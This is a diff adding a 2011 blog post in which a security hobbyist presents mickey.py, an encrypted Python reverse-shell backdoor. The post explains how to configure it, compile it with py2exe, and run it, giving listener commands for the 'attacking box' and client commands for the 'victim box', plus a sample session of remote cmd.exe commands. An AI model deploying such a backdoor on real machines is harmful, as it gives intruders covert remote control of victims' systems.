@@ -1,0 +1,59 @@
+---
+layout: post
+title: Creating a Custom Backdoor Part 2
+date: 2011-04-11 13:00:20.000000000 -04:00
+type: post
+published: true
+status: publish
+categories:
+- Code
+- Just For Fun
+- Learn
+- Research
+tags:
+- backdoor
+- mickey
+- python
+meta:
+  _edit_last: '20119316'
+  _wpas_skip_linkedin: '1'
+  _wpas_skip_twitter: '1'
+author:
+  login: averagesecurityguy
+  email: stephen@averagesecurityguy.info
+  display_name: averagesecurityguy
+  first_name: ''
+  last_name: ''
+---
+<p>I have finished creating my custom backdoor script in Python, <a href="http://github.com/averagesecurityguy/mickey">mickey.py</a>. I am still working out some kinks in py2exe so I haven't created the executable yet. Once I do I will let you know. For now, I wanted to go ahead and share the script. My goals were to create a python script that acts as a reverse shell and supports encryption and authentication. I also wanted to keep things as simple as possible. Read the <a href="http://wp.me/p1jUmx-3n">first part</a> of this entry for more details.</p>
+<h3>Configuration</h3>
+<p>You will need to modify the script to use your authentication password (token) and encryption key. After that you need to compile the script using py2exe. All data sent between the client and server will be encrypted using blowfish and the key specified. Commands will not be accepted until the server successfully authenticates with the client.</p>
+<h3>Usage:</h3>
+<p>Start up a server on the attacking box:</p>
+<pre>mickey 127.0.0.1 8000 -l</pre>
+<p>Start up a client on the victim box:</p>
+<pre>mickey 127.0.0.1 8000 -c</pre>
+<p>From the server send the password to the client. If the password matches then you can start sending commands. If it does not match the client will send back an empty response. Commands sent to the client will be executed using cmd.exe. You cannot run interactive commands because it will screw up the connection. Use the 'close-mickey' command to "log out" and leave mickey running or the 'quit-mickey' command to shut down both the server and the client.</p>
+<pre>C:\mickey&gt;mickey.py 127.0.0.1 8000 -l
+PASSWORD
+ABCDEFGH
+dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 5423-C74E
+
+ Directory of C:\mickey
+
+04/11/2011  01:40 PM              .
+04/11/2011  01:40 PM              ..
+04/11/2011  01:40 PM             2,518 blockcipher.py
+04/11/2011  01:40 PM             3,900 blockcipher.pyc
+04/09/2011  09:06 PM            24,730 blowfish.py
+04/11/2011  01:26 PM            22,752 blowfish.pyc
+04/11/2011  01:45 PM             3,316 mickey.py
+               5 File(s)         57,216 bytes
+               2 Dir(s)  246,896,156,672 bytes free
+
+C:\mickey&gt;</pre>
+<h3>Feedback</h3>
+<p>I enjoy writing code but often feel the code I write is not useful for anyone but me. If you find this code useful let me know. If you have any suggestions to make this code better let me know as well.</p>
